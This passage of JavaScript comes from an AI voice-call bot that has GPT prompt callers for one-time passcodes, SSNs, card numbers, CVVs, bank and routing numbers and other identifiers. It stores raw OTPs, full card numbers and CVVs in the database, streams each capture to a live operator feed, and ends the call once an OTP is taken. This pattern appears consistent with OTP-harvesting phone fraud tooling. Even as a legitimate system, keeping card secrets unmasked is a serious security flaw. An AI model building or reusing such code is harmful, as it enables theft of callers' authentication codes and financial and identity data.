    const maxExpected = typeof expectation?.max_digits === 'number' ? expectation.max_digits : 8;
    const dynamicRegex = expectation
      ? new RegExp(`\\b\\d{${minExpected},${maxExpected}}\\b`, 'g')
      : OTP_REGEX;
    const numericCodes = [...text.matchAll(dynamicRegex)].map((m) => m[0]);
    const spokenCodes = extractSpokenDigitSequences(text).filter((code) => code.length >= minExpected && code.length <= maxExpected);
    const codes = [...numericCodes, ...spokenCodes];
    const otpDetected = codes.length > 0;
    const masked = text.replace(dynamicRegex, '******').replace(SPOKEN_DIGIT_PATTERN, '******');
    return {
      raw: text,
      maskedForGpt: maskForGpt ? masked : text,
      maskedForLogs: masked,
      otpDetected,
      codes
    };
  }

  function maskOtpForExternal(text = '') {
    if (!text) return text;
    return text.replace(OTP_REGEX, '******').replace(SPOKEN_DIGIT_PATTERN, '******');
  }

  function buildExpectationFromConfig(callConfig = {}) {
    const profile = String(callConfig.collection_profile || '').trim().toLowerCase();
    if (!profile) return null;
    if (!isKnownDigitProfile(profile)) {
      logger.warn(`Unknown collection_profile "${profile}" - ignoring digit collection config.`);
      return null;
    }
    const defaults = getDigitProfileDefaults(profile);
    const expectedLength = Number(callConfig.collection_expected_length);
    const explicitLength = Number.isFinite(expectedLength) ? expectedLength : null;
    const minDigits = explicitLength || defaults.min_digits || 1;
    const maxDigits = explicitLength || defaults.max_digits || minDigits;
    const timeout = Number(callConfig.collection_timeout_s);
    const timeout_s = Number.isFinite(timeout) ? timeout : defaults.timeout_s;
    const retries = Number(callConfig.collection_max_retries);
    const max_retries = Number.isFinite(retries) ? retries : defaults.max_retries;
    const menu_options = Array.isArray(callConfig.collection_menu_options) ? callConfig.collection_menu_options : [];
    const mask_for_gpt = typeof callConfig.collection_mask_for_gpt === 'boolean'
      ? callConfig.collection_mask_for_gpt
      : (typeof defaults.mask_for_gpt === 'boolean' ? defaults.mask_for_gpt : true);
    const speak_confirmation = typeof callConfig.collection_speak_confirmation === 'boolean'
      ? callConfig.collection_speak_confirmation
      : false;
    const prompt = ''; // initial prompt now comes from bot payload, not profile
    const end_call_on_success = (profile === 'verification' || profile === 'otp')
      ? true
      : (typeof defaults.end_call_on_success === 'boolean' ? defaults.end_call_on_success : false);
    return {
      profile,
      min_digits: minDigits,
      max_digits: maxDigits,
      timeout_s,
      max_retries,
      menu_options,
      mask_for_gpt,
      speak_confirmation,
      prompt,
      end_call_on_success
    };
  }

  function resolveLockedExpectation(callConfig = {}) {
    if (!callConfig) return null;
    const tpl = callConfig.template_policy || {};
    if (tpl.requires_otp) {
      const len = tpl.expected_length || otpLength;
      const preferredProfile = isKnownDigitProfile(tpl.default_profile) ? tpl.default_profile : 'verification';
      return normalizeDigitExpectation({
        profile: preferredProfile,
        min_digits: len,
        max_digits: len,
        force_exact_length: len,
        prompt: ''
      });
    }
    if (tpl.default_profile && tpl.default_profile !== 'generic') {
      if (!isKnownDigitProfile(tpl.default_profile)) {
        logger.warn(`Unknown template default_profile "${tpl.default_profile}" - skipping template default.`);
      } else {
        const len = tpl.expected_length || (tpl.default_profile === 'menu' ? 1 : otpLength);
        return normalizeDigitExpectation({
          profile: tpl.default_profile,
          min_digits: len,
          max_digits: len,
          force_exact_length: tpl.default_profile === 'menu' ? undefined : len,
          prompt: ''
        });
      }
    }
    const fromConfig = buildExpectationFromConfig(callConfig);
    if (fromConfig?.profile) {
      return normalizeDigitExpectation({ ...fromConfig, prompt: '' });
    }
    const fromIntent = callConfig?.digit_intent?.expectation;
    if (fromIntent?.profile) {
      return normalizeDigitExpectation({ ...fromIntent, prompt: fromIntent.prompt || '' });
    }
    return null;
  }

  function inferDigitExpectationFromText(text = '', callConfig = {}) {
    const lower = String(text || '').toLowerCase();
    const tpl = callConfig.template_policy || {};
    const contains = (re) => re.test(lower);
    const numberHint = (re) => {
      const m = lower.match(re);
      return m ? parseInt(m[1], 10) : null;
    };
    const hasPress = contains(/\bpress\b/);
    const hasEnter = contains(/\b(enter|input|key in|type|dial)\b/);
    const hasMenu = contains(/\b(option|menu)\b/);
    const explicitLen = numberHint(/\b(\d{4,8})\b/);
    const explicitCommand = hasPress || hasEnter;
    const hasStrongOtpSignals = contains(/\b(otp|one[-\s]?time|verification code|passcode|pin|auth(?:entication)? code)\b/);
    const hasOtpDeliveryPhrase = contains(/\b(text message code|sms code|texted code)\b/);
    const hasOtpDelivery = contains(/\b(text message|sms|texted)\b/);
    const hasDigitWord = contains(/\bdigit(s)?\b/);
    const hasOtpDeliveryDigits = hasOtpDelivery && (hasDigitWord || explicitLen);
    const hasConfirmationCode = contains(/\bconfirmation\s*(?:code|number|no\.?|id|#)\b/);

    if (tpl.requires_otp) {
      const len = tpl.expected_length || otpLength;
      return {
        profile: tpl.default_profile || 'verification',
        min_digits: len,
        max_digits: len,
        force_exact_length: len,
        prompt: '',
        end_call_on_success: true,
        max_retries: otpMaxRetries,
        confidence: 0.95,
        reason: 'template_requires_otp',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    if (tpl.default_profile && tpl.default_profile !== 'generic') {
      if (!isKnownDigitProfile(tpl.default_profile)) {
        logger.warn(`Unknown template default_profile "${tpl.default_profile}" - skipping template default.`);
      } else {
        const len = tpl.expected_length || (tpl.default_profile === 'menu' ? 1 : otpLength);
        return {
          profile: tpl.default_profile,
          min_digits: len,
          max_digits: len,
          force_exact_length: tpl.default_profile === 'menu' ? undefined : len,
          prompt: '',
          end_call_on_success: tpl.default_profile === 'verification',
          max_retries: otpMaxRetries,
          confidence: 0.8,
          reason: 'template_default_profile',
          allow_terminator: tpl.allow_terminator === true,
          terminator_char: tpl.terminator_char || '#'
        };
      }
    }

    const hasOtpSignals = hasStrongOtpSignals
      || hasOtpDeliveryPhrase
      || hasOtpDeliveryDigits
      || (hasConfirmationCode && hasOtpDelivery);

    if (hasOtpSignals && explicitCommand) {
      const len = explicitLen || otpLength;
      return {
        profile: 'verification',
        min_digits: len,
        max_digits: len,
        force_exact_length: len,
        prompt: '',
        end_call_on_success: true,
        max_retries: otpMaxRetries,
        confidence: 0.8,
        reason: 'otp_keyword',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    // Specific deterministic profiles (requires action verb)
    const specificExpectation = (() => {
      if (contains(/\brouting number\b/)) return { profile: 'routing_number', min_digits: 9, max_digits: 9, force_exact_length: 9, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.7, reason: 'routing_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(bank account|bank acct)\b/)) return { profile: 'bank_account', min_digits: 6, max_digits: 17, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'bank_account_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(ssn|social security)\b/)) return { profile: 'ssn', min_digits: 9, max_digits: 9, force_exact_length: 9, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.8, reason: 'ssn_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(date of birth|dob|birth date)\b/)) return { profile: 'dob', min_digits: 6, max_digits: 8, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.7, reason: 'dob_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(phone number|callback number|call back number)\b/)) return { profile: 'phone', min_digits: 10, max_digits: 10, force_exact_length: 10, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.65, reason: 'phone_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(member id|member number)\b/)) return { profile: 'member_id', min_digits: 6, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'member_id_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(tax id|tax identification|tin)\b/)) return { profile: 'tax_id', min_digits: 9, max_digits: 9, force_exact_length: 9, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.65, reason: 'tax_id_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\b(ein|employer identification)\b/)) return { profile: 'ein', min_digits: 9, max_digits: 9, force_exact_length: 9, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.65, reason: 'ein_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\bpolicy\s*(?:number|no\.?|id|#)\b/)) return { profile: 'policy_number', min_digits: 6, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'policy_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\binvoice\s*(?:number|no\.?|id|#)\b/)) return { profile: 'invoice_number', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'invoice_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\bconfirmation\s*(?:code|number|no\.?|id|#)\b/)) return { profile: 'confirmation_code', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'confirmation_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\bclaim\s*(?:number|no\.?|id|#)\b/)) return { profile: 'claim_number', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'claim_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\border\s*(?:number|no\.?|id|#)\b/)) return { profile: 'order_number', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'order_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\breservation\s*(?:number|no\.?|id|#)\b/)) return { profile: 'reservation_number', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'reservation_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\bticket\s*(?:number|no\.?|id|#)\b/)) return { profile: 'ticket_number', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'ticket_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      if (contains(/\bcase\s*(?:number|no\.?|id|#)\b/)) return { profile: 'case_number', min_digits: 4, max_digits: 12, prompt: '', end_call_on_success: false, max_retries: 2, confidence: 0.6, reason: 'case_keyword', allow_terminator: tpl.allow_terminator === true, terminator_char: tpl.terminator_char || '#' };
      return null;
    })();

    if (specificExpectation) {
      if (!explicitCommand) {
        return null;
      }
      return specificExpectation;
    }

    // If no explicit digit command words, avoid guessing
    if (!explicitCommand) {
      return null;
    }

    // Priority 3: menu (requires menu + command)
    if (hasMenu && (hasPress || hasEnter)) {
      return {
        profile: 'menu',
        min_digits: 1,
        max_digits: 1,
        force_exact_length: 1,
        prompt: '',
        end_call_on_success: false,
        max_retries: 2,
        confidence: 0.7,
        reason: 'menu_keyword',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    // Priority 4: generic account (only when account+number present)
    if (contains(/\b(account|customer|member)\b/) && contains(/\bnumber\b/)) {
      return {
        profile: 'account',
        min_digits: 6,
        max_digits: 12,
        confirmation_style: 'last4',
        speak_confirmation: false,
        prompt: '',
        end_call_on_success: false,
        max_retries: 2,
        confidence: 0.55,
        reason: 'account_keyword',
        allow_terminator: tpl.allow_terminator === true,
        terminator_char: tpl.terminator_char || '#'
      };
    }

    return null;
  }

  function determineDigitIntent(callConfig = {}) {
    const locked = resolveLockedExpectation(callConfig);
    if (locked) {
      return {
        mode: 'dtmf',
        reason: 'explicit_config',
        confidence: 0.95,
        expectation: locked
      };
    }
    return { mode: 'normal', reason: 'no_signal', confidence: 0 };
  }

  function prepareInitialExpectation(callSid, callConfig = {}) {
    const intent = determineDigitIntent(callConfig);
    if (intent.mode !== 'dtmf' || !intent.expectation) {
      return { intent, expectation: null };
    }
    const payload = normalizeDigitExpectation({
      ...intent.expectation,
      prompt: '',
      prompt_hint: `${callConfig.first_message || ''} ${callConfig.prompt || ''}`
    });
    payload.reason = intent.reason || 'initial_intent';
    digitCollectionManager.setExpectation(callSid, payload);
    return { intent, expectation: payload };
  }

  async function startNextDigitPlanStep(callSid, plan, gptService = null, interactionCount = 0) {
    if (!plan || !Array.isArray(plan.steps) || plan.index >= plan.steps.length) return;
    const step = plan.steps[plan.index];
    const callConfig = callConfigurations.get(callSid);
    const promptHint = [callConfig?.first_message, callConfig?.prompt]
      .filter(Boolean)
      .join(' ');
    const payload = normalizeDigitExpectation({ ...step, prompt_hint: promptHint });
    payload.plan_id = plan.id;
    payload.plan_step_index = plan.index + 1;
    payload.plan_total_steps = plan.steps.length;

    digitCollectionManager.setExpectation(callSid, payload);
    if (typeof clearSilenceTimer === 'function') {
      clearSilenceTimer(callSid);
    }

    try {
      await db.updateCallState(callSid, 'digit_collection_requested', payload);
    } catch (err) {
      logger.error('digit plan step updateCallState error:', err);
    }

    const stepLabel = payload.profile || 'digits';
    webhookService.addLiveEvent(callSid, `🔢 Collect digits (${stepLabel}) step ${payload.plan_step_index}/${payload.plan_total_steps}`, { force: true });

    await flushBufferedDigits(callSid, gptService, interactionCount, 'dtmf', { allowCallEnd: true });
    const currentExpectation = digitCollectionManager.expectations.get(callSid);
    if (!currentExpectation) {
      return;
    }
    if (currentExpectation.plan_id && currentExpectation.plan_id !== payload.plan_id) {
      return;
    }
    if (currentExpectation.plan_step_index && currentExpectation.plan_step_index !== payload.plan_step_index) {
      return;
    }

    scheduleDigitTimeout(callSid, gptService, interactionCount);

    if (gptService) {
      const basePrompt = payload.prompt || buildDigitPrompt(payload);
      const instruction = payload.plan_total_steps
        ? `Step ${payload.plan_step_index} of ${payload.plan_total_steps}. ${basePrompt}`
        : basePrompt;
      gptService.emit('gptreply', {
        partialResponseIndex: null,
        partialResponse: instruction,
        personalityInfo: gptService.personalityEngine.getCurrentPersonality(),
        adaptationHistory: gptService.personalityChanges?.slice(-3) || []
      }, interactionCount);
      try {
        gptService.updateUserContext('digit_collection_plan', 'system', `Digit plan step ${payload.plan_step_index}/${payload.plan_total_steps} (${payload.profile})`);
      } catch (_) {}
      markDigitPrompted(callSid, gptService, interactionCount, 'dtmf', { allowCallEnd: true });
    }
  }

  async function requestDigitCollection(callSid, args = {}, gptService = null) {
    const requestedProfile = args.profile ? String(args.profile).toLowerCase() : null;
    if (requestedProfile && !isKnownDigitProfile(requestedProfile)) {
      webhookService.addLiveEvent(callSid, `⚠️ Unknown digit profile "${requestedProfile}"`, { force: true });
      return { error: 'unknown_profile', profile: requestedProfile };
    }
    if (digitCollectionPlans.has(callSid)) {
      clearDigitPlan(callSid);
    }
    setCallDigitIntent(callSid, { mode: 'dtmf', reason: 'tool_request', confidence: 1 });
    const callConfig = callConfigurations.get(callSid);
    const lockedExpectation = resolveLockedExpectation(callConfig);
    if (!lockedExpectation?.profile && !requestedProfile) {
      webhookService.addLiveEvent(callSid, '⚠️ Digit profile required', { force: true });
      return { error: 'profile_required' };
    }
    if (lockedExpectation?.profile) {
      if (requestedProfile && requestedProfile !== lockedExpectation.profile) {
        logger.warn(`Digit profile override: ${requestedProfile} -> ${lockedExpectation.profile}`);
        webhookService.addLiveEvent(callSid, `🔒 Digit profile locked to ${lockedExpectation.profile}`, { force: true });
      }
      args = {
        ...args,
        profile: lockedExpectation.profile
      };
      if (typeof args.min_digits !== 'number' && typeof lockedExpectation.min_digits === 'number') {
        args.min_digits = lockedExpectation.min_digits;
      }
      if (typeof args.max_digits !== 'number' && typeof lockedExpectation.max_digits === 'number') {
        args.max_digits = lockedExpectation.max_digits;
      }
      if (lockedExpectation.force_exact_length) {
        args.min_digits = lockedExpectation.force_exact_length;
        args.max_digits = lockedExpectation.force_exact_length;
      }
      if (typeof args.end_call_on_success !== 'boolean' && typeof lockedExpectation.end_call_on_success === 'boolean') {
        args.end_call_on_success = lockedExpectation.end_call_on_success;
      }
      if (typeof args.allow_terminator !== 'boolean' && typeof lockedExpectation.allow_terminator === 'boolean') {
        args.allow_terminator = lockedExpectation.allow_terminator;
      }
      if (!args.terminator_char && lockedExpectation.terminator_char) {
        args.terminator_char = lockedExpectation.terminator_char;
      }
    }
    const promptHint = [callConfig?.first_message, callConfig?.prompt]
      .filter(Boolean)
      .join(' ');
    const payload = normalizeDigitExpectation({ ...args, prompt_hint: promptHint });
    try {
      await db.updateCallState(callSid, 'digit_collection_requested', payload);
      webhookService.addLiveEvent(callSid, `🔢 Collect digits (${payload.profile}): ${payload.min_digits}-${payload.max_digits}`, { force: true });
      digitCollectionManager.setExpectation(callSid, payload);
      if (typeof clearSilenceTimer === 'function') {
        clearSilenceTimer(callSid);
      }
      await flushBufferedDigits(callSid, gptService, 0, 'dtmf', { allowCallEnd: true });
      if (!digitCollectionManager.expectations.has(callSid)) {
        return payload;
      }
      scheduleDigitTimeout(callSid, gptService, 0);
      if (gptService) {
        const instruction = payload.prompt || buildDigitPrompt(payload);
        const reply = {
          partialResponseIndex: null,
          partialResponse: instruction,
          personalityInfo: gptService.personalityEngine.getCurrentPersonality(),
          adaptationHistory: gptService.personalityChanges?.slice(-3) || []
        };
        gptService.emit('gptreply', reply, 0);
        gptService.updateUserContext('digit_collection', 'system', `Collect digits requested (${payload.profile}): expecting ${payload.min_digits}-${payload.max_digits} digits.`);
        markDigitPrompted(callSid, gptService, 0, 'dtmf', { allowCallEnd: true });
      }
    } catch (err) {
      logger.error('collect_digits handler error:', err);
    }
    return payload;
  }

  async function requestDigitCollectionPlan(callSid, args = {}, gptService = null) {
    const steps = Array.isArray(args.steps) ? args.steps : [];
    if (!steps.length) {
      return { error: 'No steps provided' };
    }
    const unknownStep = steps.find((step) => step.profile && !isKnownDigitProfile(step.profile));
    if (unknownStep?.profile) {
      const invalidProfile = String(unknownStep.profile).toLowerCase();
      webhookService.addLiveEvent(callSid, `⚠️ Unknown digit profile "${invalidProfile}"`, { force: true });
      return { error: 'unknown_profile', profile: invalidProfile };
    }

    if (digitCollectionPlans.has(callSid)) {
      clearDigitPlan(callSid);
    }
    setCallDigitIntent(callSid, { mode: 'dtmf', reason: 'tool_plan', confidence: 1 });
    digitCollectionManager.expectations.delete(callSid);
    clearDigitTimeout(callSid);
    clearDigitFallbackState(callSid);

    const callConfig = callConfigurations.get(callSid);
    const lockedExpectation = resolveLockedExpectation(callConfig);
    if (!lockedExpectation?.profile && steps.some((step) => !step.profile)) {
      webhookService.addLiveEvent(callSid, '⚠️ Digit profile required for plan steps', { force: true });
      return { error: 'profile_required' };
    }
    if (lockedExpectation?.profile) {
      const mismatched = steps.some((step) => step.profile && String(step.profile).toLowerCase() !== lockedExpectation.profile);
      if (mismatched || steps.length > 1) {
        webhookService.addLiveEvent(callSid, `🔒 Digit profile locked to ${lockedExpectation.profile} (plan rejected)`, { force: true });
        return { error: 'profile_locked', expected: lockedExpectation.profile };
      }
      if (steps.length === 1 && !steps[0].profile) {
        steps[0].profile = lockedExpectation.profile;
      }
    }

    const lastStep = steps[steps.length - 1] || {};
    const planEndOnSuccess = typeof args.end_call_on_success === 'boolean'
      ? args.end_call_on_success
      : (typeof lastStep.end_call_on_success === 'boolean' ? lastStep.end_call_on_success : true);
    const plan = {
      id: `plan_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`,
      steps,
      index: 0,
      active: true,
      end_call_on_success: planEndOnSuccess,
      completion_message: typeof args.completion_message === 'string' ? args.completion_message.trim() : '',
      created_at: new Date().toISOString()
    };

    digitCollectionPlans.set(callSid, plan);
    await db.updateCallState(callSid, 'digit_collection_plan_started', {
      steps: steps.map((step) => step.profile || 'generic'),
      total_steps: steps.length
    }).catch(() => {});

    await startNextDigitPlanStep(callSid, plan, gptService, 0);
    return { status: 'started', steps: steps.length };
  }

  async function handleCollectionResult(callSid, collection, gptService = null, interactionCount = 0, source = 'dtmf', options = {}) {
    if (!collection) return;
    const allowCallEnd = options.allowCallEnd === true;
    const expectation = digitCollectionManager.expectations.get(callSid);
    const shouldEndCall = allowCallEnd && expectation?.end_call_on_success !== false;
    const expectedLabel = expectation ? buildExpectedLabel(expectation) : 'the code';
    const payload = {
      profile: collection.profile,
      raw_digits: collection.digits,
      masked: collection.masked,
      len: collection.len,
      route: collection.route || null,
      accepted: !!collection.accepted,
      retries: collection.retries || 0,
      fallback: !!collection.fallback,
      reason: collection.reason || null,
      heuristic: collection.heuristic || null
    };

    try {
      await db.updateCallState(callSid, 'digits_collected', {
        ...payload,
        masked_last4: collection.masked
      });
      await db.addCallDigitEvent({
        call_sid: callSid,
        source,
        profile: collection.profile,
        digits: collection.digits,
        len: collection.len,
        accepted: collection.accepted,
        reason: collection.reason,
        metadata: {
          masked: collection.masked,
          route: collection.route || null,
          heuristic: collection.heuristic || null
        }
      });
    } catch (err) {
      logger.error('Error logging digits_collected:', err);
    }

    const liveMasked = maskDigitsForPreview(collection.digits || collection.masked || '');
    const liveLabel = labelForProfile(collection.profile);
    if (collection.reason === 'incomplete') {
      const progressMax = expectation?.max_digits || '';
      const progress = progressMax ? ` (${collection.len}/${progressMax})` : '';
      webhookService.addLiveEvent(callSid, `🔢 ${liveLabel} progress: ${liveMasked}${progress}`, { force: true });
    } else if (collection.accepted) {
      webhookService.addLiveEvent(callSid, `✅ ${liveLabel} captured: ${liveMasked}`, { force: true });
    } else {
      const hint = collection.reason ? ` (${collection.reason.replace(/_/g, ' ')})` : '';
      webhookService.addLiveEvent(callSid, `⚠️ ${liveLabel} invalid${hint}: ${liveMasked}`, { force: true });
    }

    if (!collection.accepted && collection.reason === 'incomplete') {
      if (collection.profile === 'verification' || collection.profile === 'otp') {
        const progress = formatOtpForDisplay(collection.digits, 'progress', expectation?.max_digits);
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
      }
      scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
      return;
    }

    const personalityInfo = gptService?.personalityEngine?.getCurrentPersonality();
    const emitReply = (text) => {
      if (!gptService || !text) return;
      const reply = {
        partialResponseIndex: null,
        partialResponse: text,
        personalityInfo,
        adaptationHistory: gptService.personalityChanges?.slice(-3) || []
      };
      gptService.emit('gptreply', reply, interactionCount);
      try {
        gptService.updateUserContext('system', 'system', `Digit handling note: ${text}`);
      } catch (_) {}
    };

    if (collection.accepted) {
      clearDigitTimeout(callSid);
      clearDigitFallbackState(callSid);
      digitCollectionManager.expectations.delete(callSid);
      const profile = String(collection.profile || '').toLowerCase();
      switch (profile) {
        case 'menu':
        case 'extension':
          if (collection.route) {
            webhookService.addLiveEvent(callSid, `➡️ Routing via menu: ${collection.route}`, { force: true });
            await db.updateCallState(callSid, 'route_requested', { reason: collection.route, via: 'menu' }).catch(() => {});
          }
          break;
        case 'verification':
        case 'otp':
          webhookService.addLiveEvent(callSid, `✅ ${formatOtpForDisplay(collection.digits, showRawDigitsLive ? 'length' : 'masked')}`, { force: true });
          await db.updateCallState(callSid, 'identity_confirmed', {
            method: 'digits',
            note: `${collection.profile} digits confirmed (masked)`,
            masked: collection.masked
          }).catch(() => {});
          await db.updateCallStatus(callSid, 'in-progress', {
            last_otp: collection.digits,
            last_otp_masked: collection.masked
          }).catch(() => {});
          await db.updateCallState(callSid, 'otp_captured', {
            masked: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'account':
          webhookService.addLiveEvent(callSid, `🏷️ Account number captured (ending ${collection.masked.slice(-4)})`, { force: true });
          await db.updateCallState(callSid, 'account_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'zip':
          webhookService.addLiveEvent(callSid, `📮 ZIP captured`, { force: true });
          await db.updateCallState(callSid, 'zip_captured', {
            masked: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'amount': {
          const amountCents = Number(collection.digits);
          const dollars = (amountCents / 100).toFixed(2);
          webhookService.addLiveEvent(callSid, `💵 Amount entered: $${dollars}`, { force: true });
          await db.updateCallState(callSid, 'amount_captured', {
            amount_cents: amountCents,
            amount_display: `$${dollars}`
          }).catch(() => {});
          break;
        }
        case 'survey':
          webhookService.addLiveEvent(callSid, `📝 Survey response: ${collection.digits}`, { force: true });
          await db.updateCallState(callSid, 'survey_response', { rating: collection.digits }).catch(() => {});
          break;
        case 'callback_confirm':
          webhookService.addLiveEvent(callSid, `📞 Callback number confirmed (ending ${collection.masked.slice(-4)})`, { force: true });
          await db.updateCallState(callSid, 'callback_confirmed', {
            masked_last4: collection.masked,
            raw_digits: collection.digits
          }).catch(() => {});
          break;
        case 'card_number':
          webhookService.addLiveEvent(callSid, `💳 Card number captured (${collection.len})`, { force: true });
          await db.updateCallState(callSid, 'card_number_captured', {
            card_number: collection.digits,
            last4: collection.digits ? collection.digits.slice(-4) : null
          }).catch(() => {});
          break;
        case 'cvv':
          webhookService.addLiveEvent(callSid, `🔐 CVV captured (${collection.len})`, { force: true });
          await db.updateCallState(callSid, 'cvv_captured', {
            cvv: collection.digits
          }).catch(() => {});
          break;
        case 'card_expiry':
          webhookService.addLiveEvent(callSid, `📅 Expiry captured (${collection.digits})`, { force: true });
          await db.updateCallState(callSid, 'card_expiry_captured', {
            expiry: collection.digits
          }).catch(() => {});
          break;
        case 'ssn':
          webhookService.addLiveEvent(callSid, '🪪 SSN captured', { force: true });
          await db.updateCallState(callSid, 'ssn_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'dob':
          webhookService.addLiveEvent(callSid, '🎂 DOB captured', { force: true });
          await db.updateCallState(callSid, 'dob_captured', {
            masked: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'routing_number':
          webhookService.addLiveEvent(callSid, '🏦 Routing number captured', { force: true });
          await db.updateCallState(callSid, 'routing_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'bank_account':
          webhookService.addLiveEvent(callSid, '🏦 Bank account captured', { force: true });
          await db.updateCallState(callSid, 'bank_account_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'phone':
          webhookService.addLiveEvent(callSid, '📱 Phone number captured', { force: true });
          await db.updateCallState(callSid, 'phone_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'member_id':
          webhookService.addLiveEvent(callSid, '🧾 Member ID captured', { force: true });
          await db.updateCallState(callSid, 'member_id_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'policy_number':
          webhookService.addLiveEvent(callSid, '📄 Policy number captured', { force: true });
          await db.updateCallState(callSid, 'policy_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'invoice_number':
          webhookService.addLiveEvent(callSid, '🧾 Invoice number captured', { force: true });
          await db.updateCallState(callSid, 'invoice_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'confirmation_code':
          webhookService.addLiveEvent(callSid, '✅ Confirmation code captured', { force: true });
          await db.updateCallState(callSid, 'confirmation_code_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'tax_id':
          webhookService.addLiveEvent(callSid, '🧾 Tax ID captured', { force: true });
          await db.updateCallState(callSid, 'tax_id_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'ein':
          webhookService.addLiveEvent(callSid, '🏢 EIN captured', { force: true });
          await db.updateCallState(callSid, 'ein_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'claim_number':
          webhookService.addLiveEvent(callSid, '🧾 Claim number captured', { force: true });
          await db.updateCallState(callSid, 'claim_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'order_number':
          webhookService.addLiveEvent(callSid, '🧾 Order number captured', { force: true });
          await db.updateCallState(callSid, 'order_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'reservation_number':
          webhookService.addLiveEvent(callSid, '🧾 Reservation number captured', { force: true });
          await db.updateCallState(callSid, 'reservation_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'ticket_number':
          webhookService.addLiveEvent(callSid, '🧾 Ticket number captured', { force: true });
          await db.updateCallState(callSid, 'ticket_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        case 'case_number':
          webhookService.addLiveEvent(callSid, '🧾 Case number captured', { force: true });
          await db.updateCallState(callSid, 'case_number_captured', {
            masked_last4: collection.masked,
            len: collection.len
          }).catch(() => {});
          break;
        default:
          webhookService.addLiveEvent(callSid, `🔢 Digits captured (${collection.len})`, { force: true });
      }
      const planId = expectation?.plan_id;
      if (planId && digitCollectionPlans.has(callSid)) {
        const plan = digitCollectionPlans.get(callSid);
        if (plan?.id === planId && plan.active) {
          plan.index += 1;
          if (plan.index < plan.steps.length) {
            await startNextDigitPlanStep(callSid, plan, gptService, interactionCount + 1);
            return;
          }
          plan.active = false;
          digitCollectionPlans.delete(callSid);
          webhookService.addLiveEvent(callSid, '✅ Digit collection plan completed', { force: true });
          await db.updateCallState(callSid, 'digit_collection_plan_completed', {
            steps: plan.steps.length,
